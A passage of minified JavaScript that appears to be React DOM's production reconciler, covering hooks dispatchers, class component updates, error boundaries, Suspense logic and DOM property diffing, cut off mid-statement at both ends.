e=e(),t(e),function(){t(null)};if(t!=null)return e=e(),t.current=e,function(){t.current=null}}function Ly(e,t,n){return n=n!=null?n.concat([e]):null,Ma(4,4,My.bind(null,t,e),n)}function kd(){}function Dy(e,t){var n=ct();t=t===void 0?null:t;var s=n.memoizedState;return s!==null&&t!==null&&wd(t,s[1])?s[0]:(n.memoizedState=[e,t],e)}function _y(e,t){var n=ct();t=t===void 0?null:t;var s=n.memoizedState;return s!==null&&t!==null&&wd(t,s[1])?s[0]:(e=e(),n.memoizedState=[e,t],e)}function Fy(e,t,n){return ts&21?(kt(n,t)||(n=zg(),te.lanes|=n,ns|=n,e.baseState=!0),t):(e.baseState&&(e.baseState=!1,De=!0),e.memoizedState=n)}function ak(e,t){var n=z;z=n!==0&&4>n?n:4,e(!0);var s=kl.transition;kl.transition={};try{e(!1),t()}finally{z=n,kl.transition=s}}function By(){return ct().memoizedState}function lk(e,t,n){var s=vn(e);if(n={lane:s,action:n,hasEagerState:!1,eagerState:null,next:null},Vy(e))Wy(t,n);else if(n=ky(e,t,n,s),n!==null){var r=qe();xt(n,e,s,r),Uy(n,t,s)}}function ck(e,t,n){var s=vn(e),r={lane:s,action:n,hasEagerState:!1,eagerState:null,next:null};if(Vy(e))Wy(t,r);else{var i=e.alternate;if(e.lanes===0&&(i===null||i.lanes===0)&&(i=t.lastRenderedReducer,i!==null))try{var o=t.lastRenderedState,a=i(o,n);if(r.hasEagerState=!0,r.eagerState=a,kt(a,o)){var l=t.interleaved;l===null?(r.next=r,pd(t)):(r.next=l.next,l.next=r),t.interleaved=r;return}}catch{}finally{}n=ky(e,t,r,s),n!==null&&(r=qe(),xt(n,e,s,r),Uy(n,t,s))}}function Vy(e){var t=e.alternate;return e===te||t!==null&&t===te}function Wy(e,t){jr=na=!0;var n=e.pending;n===null?t.next=t:(t.next=n.next,n.next=t),e.pending=t}function Uy(e,t,n){if(n&4194240){var s=t.lanes;s&=e.pendingLanes,n|=s,t.lanes=n,Zu(e,n)}}var sa={readContext:lt,useCallback:Se,useContext:Se,useEffect:Se,useImperativeHandle:Se,useInsertionEffect:Se,useLayoutEffect:Se,useMemo:Se,useReducer:Se,useRef:Se,useState:Se,useDebugValue:Se,useDeferredValue:Se,useTransition:Se,useMutableSource:Se,useSyncExternalStore:Se,useId:Se,unstable_isNewReconciler:!1},uk={readContext:lt,useCallback:function(e,t){return At().memoizedState=[e,t===void 0?null:t],e},useContext:lt,useEffect:vp,useImperativeHandle:function(e,t,n){return n=n!=null?n.concat([e]):null,Ao(4194308,4,My.bind(null,t,e),n)},useLayoutEffect:function(e,t){return Ao(4194308,4,e,t)},useInsertionEffect:function(e,t){return Ao(4,2,e,t)},useMemo:function(e,t){var n=At();return t=t===void 0?null:t,e=e(),n.memoizedState=[e,t],e},useReducer:function(e,t,n){var s=At();return t=n!==void 0?n(t):t,s.memoizedState=s.baseState=t,e={pending:null,interleaved:null,lanes:0,dispatch:null,lastRenderedReducer:e,lastRenderedState:t},s.queue=e,e=e.dispatch=lk.bind(null,te,e),[s.memoizedState,e]},useRef:function(e){var t=At();return e={current:e},t.memoizedState=e},useState:wp,useDebugValue:kd,useDeferredValue:function(e){return At().memoizedState=e},useTransition:function(){var e=wp(!1),t=e[0];return e=ak.bind(null,e[1]),At().memoizedState=e,[t,e]},useMutableSource:function(){},useSyncExternalStore:function(e,t,n){var s=te,r=At();if(Z){if(n===void 0)throw Error(P(407));n=n()}else{if(n=t(),we===null)throw Error(P(349));ts&30||Ey(s,t,n)}r.memoizedState=n;var i={value:n,getSnapshot:t};return r.queue=i,vp(Py.bind(null,s,i,e),[e]),s.flags|=2048,oi(9,Ry.bind(null,s,i,n,t),void 0,null),n},useId:function(){var e=At(),t=we.identifierPrefix;if(Z){var n=$t,s=zt;n=(s&~(1<<32-bt(s)-1)).toString(32)+n,t=":"+t+"R"+n,n=ri++,0<n&&(t+="H"+n.toString(32)),t+=":"}else n=ok++,t=":"+t+"r"+n.toString(32)+":";return e.memoizedState=t},unstable_isNewReconciler:!1},dk={readContext:lt,useCallback:Dy,useContext:lt,useEffect:xd,useImperativeHandle:Ly,useInsertionEffect:Ny,useLayoutEffect:jy,useMemo:_y,useReducer:Sl,useRef:Iy,useState:function(){return Sl(ii)},useDebugValue:kd,useDeferredValue:function(e){var t=ct();return Fy(t,pe.memoizedState,e)},useTransition:function(){var e=Sl(ii)[0],t=ct().memoizedState;return[e,t]},useMutableSource:Cy,useSyncExternalStore:Ay,useId:By,unstable_isNewReconciler:!1},hk={readContext:lt,useCallback:Dy,useContext:lt,useEffect:xd,useImperativeHandle:Ly,useInsertionEffect:Ny,useLayoutEffect:jy,useMemo:_y,useReducer:Tl,useRef:Iy,useState:function(){return Tl(ii)},useDebugValue:kd,useDeferredValue:function(e){var t=ct();return pe===null?t.memoizedState=e:Fy(t,pe.memoizedState,e)},useTransition:function(){var e=Tl(ii)[0],t=ct().memoizedState;return[e,t]},useMutableSource:Cy,useSyncExternalStore:Ay,useId:By,unstable_isNewReconciler:!1};function ft(e,t){if(e&&e.defaultProps){t=ne({},t),e=e.defaultProps;for(var n in e)t[n]===void 0&&(t[n]=e[n]);return t}return t}function Fc(e,t,n,s){t=e.memoizedState,n=n(s,t),n=n==null?t:ne({},t,n),e.memoizedState=n,e.lanes===0&&(e.updateQueue.baseState=n)}var La={isMounted:function(e){return(e=e._reactInternals)?os(e)===e:!1},enqueueSetState:function(e,t,n){e=e._reactInternals;var s=qe(),r=vn(e),i=Ht(s,r);i.payload=t,n!=null&&(i.callback=n),t=yn(e,i,r),t!==null&&(xt(t,e,r,s),To(t,e,r))},enqueueReplaceState:function(e,t,n){e=e._reactInternals;var s=qe(),r=vn(e),i=Ht(s,r);i.tag=1,i.payload=t,n!=null&&(i.callback=n),t=yn(e,i,r),t!==null&&(xt(t,e,r,s),To(t,e,r))},enqueueForceUpdate:function(e,t){e=e._reactInternals;var n=qe(),s=vn(e),r=Ht(n,s);r.tag=2,t!=null&&(r.callback=t),t=yn(e,r,s),t!==null&&(xt(t,e,s,n),To(t,e,s))}};function bp(e,t,n,s,r,i,o){return e=e.stateNode,typeof e.shouldComponentUpdate=="function"?e.shouldComponentUpdate(s,i,o):t.prototype&&t.prototype.isPureReactComponent?!Jr(n,s)||!Jr(r,i):!0}function zy(e,t,n){var s=!1,r=Tn,i=t.contextType;return typeof i=="object"&&i!==null?i=lt(i):(r=Be(t)?Zn:Ae.current,s=t.contextTypes,i=(s=s!=null)?zs(e,r):Tn),t=new t(n,i),e.memoizedState=t.state!==null&&t.state!==void 0?t.state:null,t.updater=La,e.stateNode=t,t._reactInternals=e,s&&(e=e.stateNode,e.__reactInternalMemoizedUnmaskedChildContext=r,e.__reactInternalMemoizedMaskedChildContext=i),t}function xp(e,t,n,s){e=t.state,typeof t.componentWillReceiveProps=="function"&&t.componentWillReceiveProps(n,s),typeof t.UNSAFE_componentWillReceiveProps=="function"&&t.UNSAFE_componentWillReceiveProps(n,s),t.state!==e&&La.enqueueReplaceState(t,t.state,null)}function Bc(e,t,n,s){var r=e.stateNode;r.props=n,r.state=e.memoizedState,r.refs={},fd(e);var i=t.contextType;typeof i=="object"&&i!==null?r.context=lt(i):(i=Be(t)?Zn:Ae.current,r.context=zs(e,i)),r.state=e.memoizedState,i=t.getDerivedStateFromProps,typeof i=="function"&&(Fc(e,t,i,n),r.state=e.memoizedState),typeof t.getDerivedStateFromProps=="function"||typeof r.getSnapshotBeforeUpdate=="function"||typeof r.UNSAFE_componentWillMount!="function"&&typeof r.componentWillMount!="function"||(t=r.state,typeof r.componentWillMount=="function"&&r.componentWillMount(),typeof r.UNSAFE_componentWillMount=="function"&&r.UNSAFE_componentWillMount(),t!==r.state&&La.enqueueReplaceState(r,r.state,null),ea(e,n,r,s),r.state=e.memoizedState),typeof r.componentDidMount=="function"&&(e.flags|=4194308)}function Gs(e,t){try{var n="",s=t;do n+=Bx(s),s=s.return;while(s);var r=n}catch(i){r=`
Error generating stack: `+i.message+`
`+i.stack}return{value:e,source:t,stack:r,digest:null}}function Cl(e,t,n){return{value:e,source:null,stack:n??null,digest:t??null}}function Vc(e,t){try{console.error(t.value)}catch(n){setTimeout(function(){throw n})}}var pk=typeof WeakMap=="function"?WeakMap:Map;function $y(e,t,n){n=Ht(-1,n),n.tag=3,n.payload={element:null};var s=t.value;return n.callback=function(){ia||(ia=!0,Xc=s),Vc(e,t)},n}function Hy(e,t,n){n=Ht(-1,n),n.tag=3;var s=e.type.getDerivedStateFromError;if(typeof s=="function"){var r=t.value;n.payload=function(){return s(r)},n.callback=function(){Vc(e,t)}}var i=e.stateNode;return i!==null&&typeof i.componentDidCatch=="function"&&(n.callback=function(){Vc(e,t),typeof s!="function"&&(wn===null?wn=new Set([this]):wn.add(this));var o=t.stack;this.componentDidCatch(t.value,{componentStack:o!==null?o:""})}),n}function kp(e,t,n){var s=e.pingCache;if(s===null){s=e.pingCache=new pk;var r=new Set;s.set(t,r)}else r=s.get(t),r===void 0&&(r=new Set,s.set(t,r));r.has(n)||(r.add(n),e=Ek.bind(null,e,t,n),t.then(e,e))}function Sp(e){do{var t;if((t=e.tag===13)&&(t=e.memoizedState,t=t!==null?t.dehydrated!==null:!0),t)return e;e=e.return}while(e!==null);return null}function Tp(e,t,n,s,r){return e.mode&1?(e.flags|=65536,e.lanes=r,e):(e===t?e.flags|=65536:(e.flags|=128,n.flags|=131072,n.flags&=-52805,n.tag===1&&(n.alternate===null?n.tag=17:(t=Ht(-1,1),t.tag=2,yn(n,t,1))),n.lanes|=1),e)}var fk=Jt.ReactCurrentOwner,De=!1;function Ee(e,t,n,s){t.child=e===null?xy(t,null,n,s):Hs(t,e.child,n,s)}function Cp(e,t,n,s,r){n=n.render;var i=t.ref;return Ds(t,r),s=vd(e,t,n,s,i,r),n=bd(),e!==null&&!De?(t.updateQueue=e.updateQueue,t.flags&=-2053,e.lanes&=~r,Yt(e,t,r)):(Z&&n&&ad(t),t.flags|=1,Ee(e,t,s,r),t.child)}function Ap(e,t,n,s,r){if(e===null){var i=n.type;return typeof i=="function"&&!qd(i)&&i.defaultProps===void 0&&n.compare===null&&n.defaultProps===void 0?(t.tag=15,t.type=i,Qy(e,t,i,s,r)):(e=qo(n.type,null,s,t,t.mode,r),e.ref=t.ref,e.return=t,t.child=e)}if(i=e.child,!(e.lanes&r)){var o=i.memoizedProps;if(n=n.compare,n=n!==null?n:Jr,n(o,s)&&e.ref===t.ref)return Yt(e,t,r)}return t.flags|=1,e=bn(i,s),e.ref=t.ref,e.return=t,t.child=e}function Qy(e,t,n,s,r){if(e!==null){var i=e.memoizedProps;if(Jr(i,s)&&e.ref===t.ref)if(De=!1,t.pendingProps=s=i,(e.lanes&r)!==0)e.flags&131072&&(De=!0);else return t.lanes=e.lanes,Yt(e,t,r)}return Wc(e,t,n,s,r)}function Gy(e,t,n){var s=t.pendingProps,r=s.children,i=e!==null?e.memoizedState:null;if(s.mode==="hidden")if(!(t.mode&1))t.memoizedState={baseLanes:0,cachePool:null,transitions:null},K(As,He),He|=n;else{if(!(n&1073741824))return e=i!==null?i.baseLanes|n:n,t.lanes=t.childLanes=1073741824,t.memoizedState={baseLanes:e,cachePool:null,transitions:null},t.updateQueue=null,K(As,He),He|=e,null;t.memoizedState={baseLanes:0,cachePool:null,transitions:null},s=i!==null?i.baseLanes:n,K(As,He),He|=s}else i!==null?(s=i.baseLanes|n,t.memoizedState=null):s=n,K(As,He),He|=s;return Ee(e,t,r,n),t.child}function Ky(e,t){var n=t.ref;(e===null&&n!==null||e!==null&&e.ref!==n)&&(t.flags|=512,t.flags|=2097152)}function Wc(e,t,n,s,r){var i=Be(n)?Zn:Ae.current;return i=zs(t,i),Ds(t,r),n=vd(e,t,n,s,i,r),s=bd(),e!==null&&!De?(t.updateQueue=e.updateQueue,t.flags&=-2053,e.lanes&=~r,Yt(e,t,r)):(Z&&s&&ad(t),t.flags|=1,Ee(e,t,n,r),t.child)}function Ep(e,t,n,s,r){if(Be(n)){var i=!0;Ko(t)}else i=!1;if(Ds(t,r),t.stateNode===null)Eo(e,t),zy(t,n,s),Bc(t,n,s,r),s=!0;else if(e===null){var o=t.stateNode,a=t.memoizedProps;o.props=a;var l=o.context,c=n.contextType;typeof c=="object"&&c!==null?c=lt(c):(c=Be(n)?Zn:Ae.current,c=zs(t,c));var u=n.getDerivedStateFromProps,d=typeof u=="function"||typeof o.getSnapshotBeforeUpdate=="function";d||typeof o.UNSAFE_componentWillReceiveProps!="function"&&typeof o.componentWillReceiveProps!="function"||(a!==s||l!==c)&&xp(t,o,s,c),on=!1;var h=t.memoizedState;o.state=h,ea(t,s,o,r),l=t.memoizedState,a!==s||h!==l||Fe.current||on?(typeof u=="function"&&(Fc(t,n,u,s),l=t.memoizedState),(a=on||bp(t,n,a,s,h,l,c))?(d||typeof o.UNSAFE_componentWillMount!="function"&&typeof o.componentWillMount!="function"||(typeof o.componentWillMount=="function"&&o.componentWillMount(),typeof o.UNSAFE_componentWillMount=="function"&&o.UNSAFE_componentWillMount()),typeof o.componentDidMount=="function"&&(t.flags|=4194308)):(typeof o.componentDidMount=="function"&&(t.flags|=4194308),t.memoizedProps=s,t.memoizedState=l),o.props=s,o.state=l,o.context=c,s=a):(typeof o.componentDidMount=="function"&&(t.flags|=4194308),s=!1)}else{o=t.stateNode,Sy(e,t),a=t.memoizedProps,c=t.type===t.elementType?a:ft(t.type,a),o.props=c,d=t.pendingProps,h=o.context,l=n.contextType,typeof l=="object"&&l!==null?l=lt(l):(l=Be(n)?Zn:Ae.current,l=zs(t,l));var m=n.getDerivedStateFromProps;(u=typeof m=="function"||typeof o.getSnapshotBeforeUpdate=="function")||typeof o.UNSAFE_componentWillReceiveProps!="function"&&typeof o.componentWillReceiveProps!="function"||(a!==d||h!==l)&&xp(t,o,s,l),on=!1,h=t.memoizedState,o.state=h,ea(t,s,o,r);var f=t.memoizedState;a!==d||h!==f||Fe.current||on?(typeof m=="function"&&(Fc(t,n,m,s),f=t.memoizedState),(c=on||bp(t,n,c,s,h,f,l)||!1)?(u||typeof o.UNSAFE_componentWillUpdate!="function"&&typeof o.componentWillUpdate!="function"||(typeof o.componentWillUpdate=="function"&&o.componentWillUpdate(s,f,l),typeof o.UNSAFE_componentWillUpdate=="function"&&o.UNSAFE_componentWillUpdate(s,f,l)),typeof o.componentDidUpdate=="function"&&(t.flags|=4),typeof o.getSnapshotBeforeUpdate=="function"&&(t.flags|=1024)):(typeof o.componentDidUpdate!="function"||a===e.memoizedProps&&h===e.memoizedState||(t.flags|=4),typeof o.getSnapshotBeforeUpdate!="function"||a===e.memoizedProps&&h===e.memoizedState||(t.flags|=1024),t.memoizedProps=s,t.memoizedState=f),o.props=s,o.state=f,o.context=l,s=c):(typeof o.componentDidUpdate!="function"||a===e.memoizedProps&&h===e.memoizedState||(t.flags|=4),typeof o.getSnapshotBeforeUpdate!="function"||a===e.memoizedProps&&h===e.memoizedState||(t.flags|=1024),s=!1)}return Uc(e,t,n,s,i,r)}function Uc(e,t,n,s,r,i){Ky(e,t);var o=(t.flags&128)!==0;if(!s&&!o)return r&&hp(t,n,!1),Yt(e,t,i);s=t.stateNode,fk.current=t;var a=o&&typeof n.getDerivedStateFromError!="function"?null:s.render();return t.flags|=1,e!==null&&o?(t.child=Hs(t,e.child,null,i),t.child=Hs(t,null,a,i)):Ee(e,t,a,i),t.memoizedState=s.state,r&&hp(t,n,!0),t.child}function Yy(e){var t=e.stateNode;t.pendingContext?dp(e,t.pendingContext,t.pendingContext!==t.context):t.context&&dp(e,t.context,!1),md(e,t.containerInfo)}function Rp(e,t,n,s,r){return $s(),cd(r),t.flags|=256,Ee(e,t,n,s),t.child}var zc={dehydrated:null,treeContext:null,retryLane:0};function $c(e){return{baseLanes:e,cachePool:null,transitions:null}}function Xy(e,t,n){var s=t.pendingProps,r=ee.current,i=!1,o=(t.flags&128)!==0,a;if((a=o)||(a=e!==null&&e.memoizedState===null?!1:(r&2)!==0),a?(i=!0,t.flags&=-129):(e===null||e.memoizedState!==null)&&(r|=1),K(ee,r&1),e===null)return Dc(t),e=t.memoizedState,e!==null&&(e=e.dehydrated,e!==null)?(t.mode&1?e.data==="$!"?t.lanes=8:t.lanes=1073741824:t.lanes=1,null):(o=s.children,e=s.fallback,i?(s=t.mode,i=t.child,o={mode:"hidden",children:o},!(s&1)&&i!==null?(i.childLanes=0,i.pendingProps=o):i=Fa(o,s,0,null),e=Qn(e,s,n,null),i.return=t,e.return=t,i.sibling=e,t.child=i,t.child.memoizedState=$c(n),t.memoizedState=zc,e):Sd(t,o));if(r=e.memoizedState,r!==null&&(a=r.dehydrated,a!==null))return mk(e,t,o,s,a,r,n);if(i){i=s.fallback,o=t.mode,r=e.child,a=r.sibling;var l={mode:"hidden",children:s.children};return!(o&1)&&t.child!==r?(s=t.child,s.childLanes=0,s.pendingProps=l,t.deletions=null):(s=bn(r,l),s.subtreeFlags=r.subtreeFlags&14680064),a!==null?i=bn(a,i):(i=Qn(i,o,n,null),i.flags|=2),i.return=t,s.return=t,s.sibling=i,t.child=s,s=i,i=t.child,o=e.child.memoizedState,o=o===null?$c(n):{baseLanes:o.baseLanes|n,cachePool:null,transitions:o.transitions},i.memoizedState=o,i.childLanes=e.childLanes&~n,t.memoizedState=zc,s}return i=e.child,e=i.sibling,s=bn(i,{mode:"visible",children:s.children}),!(t.mode&1)&&(s.lanes=n),s.return=t,s.sibling=null,e!==null&&(n=t.deletions,n===null?(t.deletions=[e],t.flags|=16):n.push(e)),t.child=s,t.memoizedState=null,s}function Sd(e,t){return t=Fa({mode:"visible",children:t},e.mode,0,null),t.return=e,e.child=t}function Ji(e,t,n,s){return s!==null&&cd(s),Hs(t,e.child,null,n),e=Sd(t,t.pendingProps.children),e.flags|=2,t.memoizedState=null,e}function mk(e,t,n,s,r,i,o){if(n)return t.flags&256?(t.flags&=-257,s=Cl(Error(P(422))),Ji(e,t,o,s)):t.memoizedState!==null?(t.child=e.child,t.flags|=128,null):(i=s.fallback,r=t.mode,s=Fa({mode:"visible",children:s.children},r,0,null),i=Qn(i,r,o,null),i.flags|=2,s.return=t,i.return=t,s.sibling=i,t.child=s,t.mode&1&&Hs(t,e.child,null,o),t.child.memoizedState=$c(o),t.memoizedState=zc,i);if(!(t.mode&1))return Ji(e,t,o,null);if(r.data==="$!"){if(s=r.nextSibling&&r.nextSibling.dataset,s)var a=s.dgst;return s=a,i=Error(P(419)),s=Cl(i,s,void 0),Ji(e,t,o,s)}if(a=(o&e.childLanes)!==0,De||a){if(s=we,s!==null){switch(o&-o){case 4:r=2;break;case 16:r=8;break;case 64:case 128:case 256:case 512:case 1024:case 2048:case 4096:case 8192:case 16384:case 32768:case 65536:case 131072:case 262144:case 524288:case 1048576:case 2097152:case 4194304:case 8388608:case 16777216:case 33554432:case 67108864:r=32;break;case 536870912:r=268435456;break;default:r=0}r=r&(s.suspendedLanes|o)?0:r,r!==0&&r!==i.retryLane&&(i.retryLane=r,Kt(e,r),xt(s,e,r,-1))}return Pd(),s=Cl(Error(P(421))),Ji(e,t,o,s)}return r.data==="$?"?(t.flags|=128,t.child=e.child,t=Rk.bind(null,e),r._reactRetry=t,null):(e=i.treeContext,Qe=gn(r.nextSibling),Ke=t,Z=!0,gt=null,e!==null&&(st[rt++]=zt,st[rt++]=$t,st[rt++]=es,zt=e.id,$t=e.overflow,es=t),t=Sd(t,s.children),t.flags|=4096,t)}function Pp(e,t,n){e.lanes|=t;var s=e.alternate;s!==null&&(s.lanes|=t),_c(e.return,t,n)}function Al(e,t,n,s,r){var i=e.memoizedState;i===null?e.memoizedState={isBackwards:t,rendering:null,renderingStartTime:0,last:s,tail:n,tailMode:r}:(i.isBackwards=t,i.rendering=null,i.renderingStartTime=0,i.last=s,i.tail=n,i.tailMode=r)}function Jy(e,t,n){var s=t.pendingProps,r=s.revealOrder,i=s.tail;if(Ee(e,t,s.children,n),s=ee.current,s&2)s=s&1|2,t.flags|=128;else{if(e!==null&&e.flags&128)e:for(e=t.child;e!==null;){if(e.tag===13)e.memoizedState!==null&&Pp(e,n,t);else if(e.tag===19)Pp(e,n,t);else if(e.child!==null){e.child.return=e,e=e.child;continue}if(e===t)break e;for(;e.sibling===null;){if(e.return===null||e.return===t)break e;e=e.return}e.sibling.return=e.return,e=e.sibling}s&=1}if(K(ee,s),!(t.mode&1))t.memoizedState=null;else switch(r){case"forwards":for(n=t.child,r=null;n!==null;)e=n.alternate,e!==null&&ta(e)===null&&(r=n),n=n.sibling;n=r,n===null?(r=t.child,t.child=null):(r=n.sibling,n.sibling=null),Al(t,!1,r,n,i);break;case"backwards":for(n=null,r=t.child,t.child=null;r!==null;){if(e=r.alternate,e!==null&&ta(e)===null){t.child=r;break}e=r.sibling,r.sibling=n,n=r,r=e}Al(t,!0,n,null,i);break;case"together":Al(t,!1,null,null,void 0);break;default:t.memoizedState=null}return t.child}function Eo(e,t){!(t.mode&1)&&e!==null&&(e.alternate=null,t.alternate=null,t.flags|=2)}function Yt(e,t,n){if(e!==null&&(t.dependencies=e.dependencies),ns|=t.lanes,!(n&t.childLanes))return null;if(e!==null&&t.child!==e.child)throw Error(P(153));if(t.child!==null){for(e=t.child,n=bn(e,e.pendingProps),t.child=n,n.return=t;e.sibling!==null;)e=e.sibling,n=n.sibling=bn(e,e.pendingProps),n.return=t;n.sibling=null}return t.child}function gk(e,t,n){switch(t.tag){case 3:Yy(t),$s();break;case 5:Ty(t);break;case 1:Be(t.type)&&Ko(t);break;case 4:md(t,t.stateNode.containerInfo);break;case 10:var s=t.type._context,r=t.memoizedProps.value;K(Jo,s._currentValue),s._currentValue=r;break;case 13:if(s=t.memoizedState,s!==null)return s.dehydrated!==null?(K(ee,ee.current&1),t.flags|=128,null):n&t.child.childLanes?Xy(e,t,n):(K(ee,ee.current&1),e=Yt(e,t,n),e!==null?e.sibling:null);K(ee,ee.current&1);break;case 19:if(s=(n&t.childLanes)!==0,e.flags&128){if(s)return Jy(e,t,n);t.flags|=128}if(r=t.memoizedState,r!==null&&(r.rendering=null,r.tail=null,r.lastEffect=null),K(ee,ee.current),s)break;return null;case 22:case 23:return t.lanes=0,Gy(e,t,n)}return Yt(e,t,n)}var Zy,Hc,ew,tw;Zy=function(e,t){for(var n=t.child;n!==null;){if(n.tag===5||n.tag===6)e.appendChild(n.stateNode);else if(n.tag!==4&&n.child!==null){n.child.return=n,n=n.child;continue}if(n===t)break;for(;n.sibling===null;){if(n.return===null||n.return===t)return;n=n.return}n.sibling.return=n.return,n=n.sibling}};Hc=function(){};ew=function(e,t,n,s){var r=e.memoizedProps;if(r!==s){e=t.stateNode,Wn(jt.current);var i=null;switch(n){case"input":r=fc(e,r),s=fc(e,s),i=[];break;case"select":r=ne({},r,{value:void 0}),s=ne({},s,{value:void 0}),i=[];break;case"textarea":r=yc(e,r),s=yc(e,s),i=[];break;default:typeof r.onClick!="function"&&typeof s.onClick=="function"&&(e.onclick=Qo)}vc(n,s);var o;n=null;for(c in r)if(!s.hasOwnProperty(c)&&r.hasOwnProperty(c)&&r[c]!=null)if(c==="style"){var a=r[c];for(o in a)a.hasOwnProperty(o)&&(n||(n={}),n[o]="")}else c!=="dangerouslySetInnerHTML"&&c!=="children"&&c!=="suppressContentEditableWarning"&&c!=="suppressHydrationWarning"&&c!=="autoFocus"&&($r.hasOwnProperty(c)?i||(i=[]):(i=i||[]).push(c,null));for(c in s){var l=s[c];if(a=r!=null?r[c]:void 0,s.hasOwnProperty(c)&&l!==a&&(l!=null||a!=null))if(c==="style")if(a){for(o in a)!a.hasOwnProperty(o)||l&&l.hasOwnProperty(o)||(n||(n={}),n[o]="");for(o in l)l.hasOwnProperty(o)&&a[o]!==l[o]&&(n||(n={}),n[o]=l[o])}else n||(i||(i=[]),i.push(c,n)),n=l;else c==="dangerouslySetInnerHTML"?(l=l?l.__html:void 0,a=a?a.__html:void 0,l!=null&&a!==l&&(i=i||[]).push(c,l)):c==="children"?typeof l!="string"&&typeof l!="number"||(i=i||[]).push(c,""+l):c!=="suppressContentEditableWarning"&&c!=="suppressHydrationWarning"&&($r.hasOwnProperty(c)?(l!=null&&c==="onScroll"&&X("scroll",e),i||a===l||(i=[])):(i=i||[]).push(c,l))}n&&(i=i||[]).push("style",n);var c=i;(t.updateQueue=c)&&(t.flags|=4)}};tw=function(e,t,n,s){n!==s&&(t.flags|=4)};function mr(e,t){if(!Z)switch(e.tailMode){case"hidden":t=e.tail;for(var n=null;t!==null;)t.alternate!==null&&(n=t),t=t.sibling;n===null?e.tail=null:n.sibling=null;break;case"collapsed":n=e.tail;for(var s=null;n!==null;)n.alternate!==null&&(s=n),n=n.sibling;s===null?t||e.tail===null?e.tail=null:e.tail.sibling=null:s.sibling=null}}function Te(e){var t=e.alternate!==null&&e.alternate.child===e.child,n=0,s=0;if(t)for(var r=e.child;r!==null;)n|=r.lanes|r.childLanes,s|=r.subtreeFlags&14680064,s|=r.flags&14680064,r.return=e,r=r.sibling;else for(r=e.child;r!==null;)n|=r.lanes|r.childLanes,s|=r.subtreeFlags,s|=r.flags,r.return=e,r=r.sibling;return e.subtreeFlags|=s,e.childLanes=n,t}function yk(e,t,n){var s=t.pendingProps;switch(ld(t),t.tag){case 2:case 16:case 15:case 0:case 11:case 7:case 8:case 12:case 9:case 14:return Te(t),null;case 1:return Be(t.type)&&Go(),Te(t),null;case 3:return s=t.stateNode,Qs(),J(Fe),J(Ae),yd(),s.pendingContext&&(s.context=s.pendingContext,s.pendingContext=null),(e===null||e.child===null)&&(Yi(t)?t.flags|=4:e===null||e.memoizedState.isDehydrated&&!(t.flags&256)||(t.flags|=1024,gt!==null&&(eu(gt),gt=null))),Hc(e,t),Te(t),null;case 5:gd(t);var r=Wn(si.current);if(n=t.type,e!==null&&t.stateNode!=null)ew(e,t,n,s,r),e.ref!==t.ref&&(t.flags|=512,t.flags|=2097152);else{if(!s){if(t.stateNode===null)throw Error(P(166));return Te(t),null}if(e=Wn(jt.current),Yi(t)){s=t.stateNode,n=t.type;var i=t.memoizedProps;switch(s[qt]=t,s[ti]=i,e=(t.mode&1)!==0,n){case"dialog":X("cancel",s),X("close",s);break;case"iframe":case"object":case"embed":X("load",s);break;case"video":case"audio":for(r=0;r<kr.length;r++)X(kr[r],s);break;case"source":X("error",s);break;case"img":case"image":case"link":X("error",s),X("load",s);break;case"details":X("toggle",s);break;case"input":_h(s,i),X("invalid",s);break;case"select":s._wrapperState={wasMultiple:!!i.multiple},X("invalid",s);break;case"textarea":Bh(s,i),X("invalid",s)}vc(n,i),r=null;for(var o in i)if(i.hasOwnProperty(o)){var a=i[o];o==="children"?typeof a=="string"?s.textContent!==a&&(i.suppressHydrationWarning!==!0&&Ki(s.textContent,a,e),r=["children",a]):typeof a=="number"&&s.textContent!==""+a&&(i.suppressHydrationWarning!==!0&&Ki(s.textContent,a,e),r=["children",""+a]):$r.hasOwnProperty(o)&&a!=null&&o==="onScroll"&&X("scroll",s)}switch(n){case"input":Vi(s),Fh(s,i,!0);break;case"textarea":Vi(s),Vh(s);break;case"select":case"option":break;default:typeof i.onClick=="function"&&(s.onclick=Qo)}s=r,t.updateQueue=s,s!==null&&(t.flags|=4)}else{o=r.nodeType===9?r:r.ownerDocument,e==="http://www.w3.org/1999/xhtml"&&(e=Pg(n)),e==="http://www.w3.org/1999/xhtml"?n==="script"?(e=o.createElement("div"),e.innerHTML="<script><\/script>",e=e.removeChild(e.firstChild)):typeof s.is=="string"?e=o.createElement(n,{is:s.is}):(e=o.createElement(n),n==="select"&&(o=e,s.multiple?o.multiple=!0:s.size&&(o.size=s.size))):e=o.createElementNS(e,n),e[qt]=t,e[ti]=s,Zy(e,t,!1,!1),t.stateNode=e;e:{switch(o=bc(n,s),n){case"dialog":X("cancel",e),X("close",e),r=s;break;case"iframe":case"object":case"embed":X("load",e),r=s;break;case"video":case"audio":for(r=0;r<kr.length;r++)X(kr[r],e);r=s;break;case"source":X("error",e),r=s;break;case"img":case"image":case"link":X("error",e),X("load",e),r=s;break;case"details":X("toggle",e),r=s;break;case"input":_h(e,s),r=fc(e,s),X("invalid",e);break;case"option":r=s;break;case"select":e._wrapperState={wasMultiple:!!s.multiple},r=ne({},s,{value:void 0}),X("invalid",e);break;case"textarea":Bh(e,s),r=yc(e,s),X("invalid",e);break;default:r=s}vc(n,r),a=r;for(i in a)if(a.hasOwnProperty(i)){var l=a[i];i==="style"?Ig(e,l):i==="dangerouslySetInnerHTML"?(l=l?l.__html:void 0,l!=null&&qg(e,l)):i==="children"?typeof l=="string"?(n!=="textarea"||l!=="")&&Hr(e,l):typeof l=="number"&&Hr(e,""+l):i!=="suppressContentEditableWarning"&&i!=="suppressHydrationWarning"&&i!=="autoFocus"&&($r.hasOwnProperty(i)?l!=null&&i==="onScroll"&&X("scroll",e):l!=null&&Qu(e,i,l,o))}switch(n){case"input":Vi(e),Fh(e,s,!1);break;case"textarea":Vi(e),Vh(e);break;case"option":s.value!=null&&e.setAttribute("value",""+Sn(s.value));break;case"select":e.multiple=!!s.multiple,i=s.value,i!=null?Ns(e,!!s.multiple,i,!1):s.defaultValue!=null&&Ns(e,!!s.multiple,s.defaultValue,!0);break;default:typeof r.onClick=="function"&&(e.onclick=Qo)}switch(n){case"button":case"input":case"select":case"textarea":s=!!s.autoFocus;break e;case"img":s=!0;break e;default:s=!1}}s&&(t.flags|=4)}t.ref!==null&&(t.flags|=512,t.flags|=2097152)}return Te(t),null;case 6:if(e&&t.stateNode!=null)tw(e,t,e.memoizedProps,s);else{if(typeof s!="string"&&t.stateNode===null)throw 